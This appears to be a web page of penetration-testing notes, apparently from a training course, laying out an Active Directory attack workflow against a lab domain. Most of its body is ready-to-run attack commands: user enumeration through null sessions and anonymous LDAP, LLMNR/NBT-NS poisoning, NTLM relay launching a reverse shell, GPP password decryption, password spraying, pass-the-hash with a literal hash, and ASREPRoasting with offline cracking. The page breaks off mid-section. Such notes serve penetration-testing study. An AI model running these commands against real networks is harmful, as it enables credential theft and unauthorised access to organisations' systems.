  <span class="md-ellipsis">
    Attacks
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_10_2_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10_2_10">
            <span class="md-nav__icon md-icon"></span>
            Attacks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Attacks/CGIShellshock/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CGI Attacks
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10_3" >
        
          
          <label class="md-nav__link" for="__nav_3_10_3" id="__nav_3_10_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Fuzzing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_10_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10_3">
            <span class="md-nav__icon md-icon"></span>
            Fuzzing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Fuzzing/Ffuf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ffuf
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10_4" >
        
          
          <label class="md-nav__link" for="__nav_3_10_4" id="__nav_3_10_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    InformationGathering
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_10_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10_4">
            <span class="md-nav__icon md-icon"></span>
            InformationGathering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/InformationGathering/ActiveInformationGathering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ActiveInformationGathering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/InformationGathering/WebInformationGathering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WebInformationGathering
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10_5" >
        
          
          <label class="md-nav__link" for="__nav_3_10_5" id="__nav_3_10_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    OWASP
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_10_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10_5">
            <span class="md-nav__icon md-icon"></span>
            OWASP
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/CI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Command Injection(CI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/FI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FILE INCLUSION(FI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/FileUpload/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FileUpload
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/HTTPVerbTampering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Verb Tampering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/IDOR/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IDOR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/NOSQLI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NOSQL INJECTION(NOSQLI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/SQLi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQLi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/SSTI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Server Side Template Injection(SSTI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/XEE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XML External Entity(XEE)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/OWASP/XSS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross Site Scripting(XSS)
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#domain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Domain Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identifying-hosts" class="md-nav__link">
    <span class="md-ellipsis">
      Identifying Hosts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scan-alive-hosts" class="md-nav__link">
    <span class="md-ellipsis">
      Scan Alive hosts
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#making-a-target-user-list" class="md-nav__link">
    <span class="md-ellipsis">
      Making a Target User List
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Making a Target User List">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-null-session-to-pull-user-list" class="md-nav__link">
    <span class="md-ellipsis">
      SMB NULL Session to Pull User List
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gathering-users-with-ldap-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      Gathering Users with LDAP Anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-users-with-kerbrute" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating Users with Kerbrute
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#llmnrnbt-ns-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      LLMNR/NBT-NS Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLMNR/NBT-NS Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#responder-httpsgithubcomlgandxresponder" class="md-nav__link">
    <span class="md-ellipsis">
      [Responder] (https://github.com/lgandx/Responder)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#c-inveigh-inveighzero" class="md-nav__link">
    <span class="md-ellipsis">
      C# Inveigh (InveighZero)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-an-ntlmv2-hash-with-hashcat" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking an NTLMv2 Hash With Hashcat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relay" class="md-nav__link">
    <span class="md-ellipsis">
      Relay
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#low-hanging-fruits" class="md-nav__link">
    <span class="md-ellipsis">
      Low Hanging Fruits
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Low Hanging Fruits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#zerologon" class="md-nav__link">
    <span class="md-ellipsis">
      ZeroLogon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credentials-in-smb-shares-and-sysvol-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Credentials in SMB Shares and SYSVOL Scripts
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Credentials in SMB Shares and SYSVOL Scripts">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovering" class="md-nav__link">
    <span class="md-ellipsis">
      Discovering
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-policy-preferences-gpp-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Group Policy Preferences (GPP) Passwords
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Group Policy Preferences (GPP) Passwords">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locating-retrieving-gpp-passwords-with-crackmapexec" class="md-nav__link">
    <span class="md-ellipsis">
      Locating &amp; Retrieving GPP Passwords with CrackMapExec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-the-password-with-gpp-decrypt" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting the Password with gpp-decrypt
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<p>There is no "one way", we need to go back and furth in the phases, roll back to the first one even with valid credentials, skip one and comeback later to it, etc...</p>
<p> The important thing is to make sure if stuck is to check all step done till the point where got stuck. </p>

<h1 id="no-credentials">No Credentials</h1>
<h2 id="domain-enumeration">Domain Enumeration</h2>
<h3 id="identifying-hosts">Identifying Hosts</h3>
<pre><code class="language-bash">$ sudo -E wireshark

$ sudo tcpdump -i ens224 

$ sudo responder -I ens224 -A 

$ fping -asgq 172.16.5.0/23
</code></pre>
<h2 id="scan-alive-hosts">Scan Alive hosts</h2>
<p>Check <a href="../../Enumeration/Discovery/Nmap/">nmap</a></p>
<blockquote>
<p>Focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos to find DC ip.</p>
</blockquote>
<h2 id="making-a-target-user-list">Making a Target User List</h2>
<ul>
<li>By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller</li>
<li>Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list</li>
<li>Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users</li>
<li>Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist</li>
</ul>
<h3 id="smb-null-session-to-pull-user-list">SMB NULL Session to Pull User List</h3>
<p>If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.</p>
<p>It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.</p>
<p>Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.</p>
<pre><code class="language-bash"># Using enum4linux
$ enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;

# Using rpcclient
$ rpcclient -U &quot;&quot; -N 172.16.5.5
rpcclient $&gt; enumdomusers 

# Using CrackMapExec
$ crackmapexec smb 172.16.5.5 --users
$ awk '{ print $5 }' users.txt | cut -d'\' -f2 &gt;&gt; validusers.txt
</code></pre>
<h3 id="gathering-users-with-ldap-anonymous">Gathering Users with LDAP Anonymous</h3>
<pre><code class="language-bash"># Using ldapsearch
$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;


## Using windapsearch

$ ./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U
</code></pre>
<h3 id="enumerating-users-with-kerbrute">Enumerating Users with Kerbrute</h3>
<pre><code class="language-bash">$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

grep -o '[a-zA-Z0-9._%+-]\+@[a-zA-Z0-9.-]\+\.[a-zA-Z]\{2,6\}' kerb.txt
cut -d &quot;@&quot; -f 1 your_file.txt
</code></pre>
<p>If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.</p>
<hr />
<h2 id="llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</h2>
<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</p>
<p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.</p>
<h3 id="responder-httpsgithubcomlgandxresponder">[Responder] (https://github.com/lgandx/Responder)</h3>
<pre><code class="language-bash">$ sudo responder -I ens224 
$ sudo responder -I ens224 -w -d
</code></pre>
<p>/usr/share/responder/logs</p>
<h3 id="inveigh"><a href="https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1">Inveigh</a></h3>
<p>If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder</p>
<pre><code class="language-powershell">PS &gt; Import-Module .\Inveigh.ps1
PS &gt; (Get-Command Invoke-Inveigh).Parameters

PS &gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
</code></pre>
<h3 id="c-inveigh-inveighzero"><a href="https://github.com/Kevin-Robertson/Inveigh/tree/master">C# Inveigh (InveighZero)</a></h3>
<p>Press ESC to enter/exit
help</p>
<pre><code class="language-powershell">PS &gt; .\Inveigh.exe
</code></pre>
<p>If a NTLM hash is found, next step will be to crack it offline using hashcat.</p>
<h3 id="cracking-an-ntlmv2-hash-with-hashcat">Cracking an NTLMv2 Hash With Hashcat</h3>
<p>Check <a href="../../BruteForce/BruteForce/#Hashcat">BruteForce</a></p>
<h3 id="relay">Relay</h3>
<p>If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.</p>
<p>First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).</p>
<pre><code>$ cat /etc/responder/Responder.conf | grep 'SMB ='
</code></pre>
<pre><code class="language-bash">$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;revshell&gt; '

$ nc -lvnp 9001
</code></pre>
<hr />
<h2 id="low-hanging-fruits">Low Hanging Fruits</h2>
<h3 id="zerologon">ZeroLogon</h3>
<h3 id="credentials-in-smb-shares-and-sysvol-scripts">Credentials in SMB Shares and SYSVOL Scripts</h3>
<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.</p>
<h4 id="discovering">Discovering</h4>
<pre><code>PS &gt; ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
</code></pre>
<h3 id="group-policy-preferences-gpp-passwords">Group Policy Preferences (GPP) Passwords</h3>
<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p>
<ul>
<li>Map drives (drives.xml)</li>
<li>Create local users</li>
<li>Create printer config files (printers.xml)</li>
<li>Creating and updating services (services.xml)</li>
<li>Creating scheduled tasks (scheduledtasks.xml)</li>
<li>Changing local admin passwords.</li>
<li>These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</li>
</ul>
<p>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p>
<h4 id="locating-retrieving-gpp-passwords-with-crackmapexec">Locating &amp; Retrieving GPP Passwords with CrackMapExec</h4>
<pre><code class="language-bash">$ crackmapexec smb -L | grep gpp
</code></pre>
<h4 id="decrypting-the-password-with-gpp-decrypt">Decrypting the Password with gpp-decrypt</h4>
<pre><code class="language-bash">$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
</code></pre>
<p>GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1, the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.</p>
<hr />
<h1 id="clear-text-password">Clear Text Password</h1>
<h2 id="check-for-password-reuse">Check for Password Reuse</h2>
<p>{ldap,mssql,smb,ssh,winrm}</p>
<pre><code class="language-bash">$ crackmapexec &lt;protocol&gt; hosts.lst -u &lt;username&gt; -p &lt;password&gt;
</code></pre>
<hr />
<h2 id="enumerating-the-password-policy">Enumerating the Password Policy</h2>
<ul>
<li>With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.</li>
</ul>
<h3 id="linux">Linux</h3>
<pre><code class="language-bash">$ crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --pass-pol
</code></pre>
<h4 id="smb-null-sessions">SMB NULL Sessions</h4>
<p>SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.</p>
<pre><code class="language-bash"># Using rpcclient
$ rpcclient -U &quot;&quot; -N &lt;DC&gt;
rpcclient $&gt; querydominfo # check SMB for more queries


# Using enum4linux
$ enum4linux -P &lt;DC&gt;


# Using enum4linux-ng
$ enum4linux-ng -P &lt;DC&gt; -oA &lt;FILE&gt;
$ cat &lt;FILE&gt;.json 


# LDAP Anonymous Bind
$ ldapsearch -h &lt;DC&gt; -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength
</code></pre>
<h3 id="windows">Windows</h3>
<h4 id="enumerating-null-session">Enumerating Null Session</h4>
<pre><code class="language-powershell">&gt; net use \\DC01\ipc$ &quot;&quot; /u:&quot;&quot;

# Using net.exe
&gt; net accounts

# Using PowerView
PS &gt; import-module .\PowerView.ps1
&gt; Get-DomainPolicy
</code></pre>
<hr />
<h2 id="password-spraying">Password Spraying</h2>
<p>Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.</p>
<h3 id="linux_1">Linux</h3>
<p>Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.</p>
<pre><code class="language-bash"># Using a Bash one-liner
$for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done

# Using Kerbrute 
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1


# Using CrackMapExec 
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p password.txt --no-bruteforce| grep + 

## Validating the Credentials with CrackMapExec
$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

## Local Administrator Password Reuse
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
</code></pre>
<h3 id="windows_1">Windows</h3>
<h4 id="using-domainpasswordsprayps1">Using DomainPasswordSpray.ps1</h4>
<pre><code class="language-powershell">PS &gt; Import-Module .\DomainPasswordSpray.ps1
PS &gt; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
</code></pre>
<hr />
<h2 id="asreproasting">ASREPRoasting</h2>
<p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.</p>
<p>With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.</p>
<p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p>
<p>Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.</p>
<h3 id="enumerating-for-dont_req_preauth-value-using-get-domainuser">Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser</h3>
<pre><code class="language-powershell">PS &gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
</code></pre>
<p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.</p>
<h3 id="retrieving-as-rep-in-proper-format-using-rubeus">Retrieving AS-REP in Proper Format using Rubeus</h3>
<pre><code class="language-powershell">PS &gt; .\Rubeus.exe asreproast /user:&lt;USERNAME&gt; /nowrap /format:&lt;hashcat|john&gt; /outfile:&lt;output_hashes_file&gt;
</code></pre>
<p>When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p>
<h3 id="retrieving-the-as-rep-using-kerbrute">Retrieving the AS-REP Using Kerbrute</h3>
<pre><code class="language-bash">$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
</code></pre>
<p>With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.</p>
<h3 id="hunting-for-users-with-kerberoast-pre-auth-not-required">Hunting for Users with Kerberoast Pre-auth Not Required</h3>
<pre><code class="language-bash">$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 

# check ASREPRoast for all domain users (credentials required)
$ python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;

# check ASREPRoast for a list of users (no credentials required)
$ python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
</code></pre>
<p>We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.</p>
<h2 id="cracking-the-hash-offline-with-hashcat">Cracking the Hash Offline with Hashcat</h2>
<pre><code class="language-bash">$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
</code></pre>
<hr />
<h1 id="got-domain-account-with-valid-credentials-ticket-hash-or-password">Got Domain Account with valid credentials (Ticket, Hash or Password)</h1>
<h2 id="credentialed-enumeration">Credentialed Enumeration</h2>
<pre><code class="language-bash"># Domain User Enumeration
$ sudo crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users
$ awk -F 'INLANEFREIGHT.LOCAL\\\\' '{print $2}' crack.txt | awk '{print $1}' &gt; new_crack.txt

$ crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --users &gt;&gt; user.txt
$ awk '{ print $5 }' users.txt | cut -d'\' -f2 &gt;&gt; validusers.txt

$ GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; 

# Domain Group Enumeration
$ sudo crackmapexec smb &lt;DC_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --groups


# Logged On Users
&quot;&quot;&quot;
local admin because (Pwn3d!)
&quot;&quot;&quot;
$ sudo crackmapexec smb &lt;MACHINE_IP&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;2 --loggedon-users

# SMB shares 
Check SMB service 

# rpcclient
Check SMB service 

# Windapsearch
## Domain Admins
